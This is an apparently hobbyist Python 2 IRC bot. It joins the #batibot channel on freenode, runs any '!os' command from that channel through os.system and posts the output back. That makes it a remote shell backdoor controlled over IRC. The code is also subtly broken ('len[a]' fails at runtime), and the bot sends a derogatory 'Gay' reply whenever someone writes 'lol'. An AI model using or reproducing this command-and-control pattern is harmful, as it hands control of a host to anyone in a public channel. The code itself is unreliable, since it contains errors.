import socket
import os
import sys
 
network = 'chat.freenode.net'
port = 6667
irc = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
irc.connect ( ( network, port ) )
print irc.recv ( 4096 )
irc.send ( 'NICK caloy\r\n' )
irc.send ( 'USER jjt jjt jjt :just a fskin decoy\r\n' )
irc.send ( 'JOIN #batibot\r\n' )
irc.send ( 'PRIVMSG #batibot :Hello World.\r\n' )
while True:
   data = irc.recv ( 4096 )
   if data.find ( 'PING' ) != -1:
      irc.send ( 'PONG ' + data.split() [ 1 ] + '\r\n' )
   if data.find ( '!quit' ) != -1:
      irc.send ( 'PRIVMSG #batibot :Fine, if you do not want me\r\n' )
      irc.send ( 'QUIT\r\n' )
   if data.find ( 'lol' ) != -1:
      irc.send ( 'PRIVMSG #batibot :Gay\r\n' )
   if data.find ( '!os') != -1:
      a = data.split('!os')
      a = a[1].split()
      to = a[0]
      if len[a] != 1:
        irc.send('PRIVMSG #batibot :usage >> <!command> <command> \r\n' )
      else:
        os.system(to+" > /tmp/tempt.txt ")
        a = open("/tmp/tempt.txt")
        ot = a.read()
        ot.replace("\r \n", "_")
        a.close()
        irc.send ('PRIVMSG #batibot :' +ot+ '\r\n')
   print data 
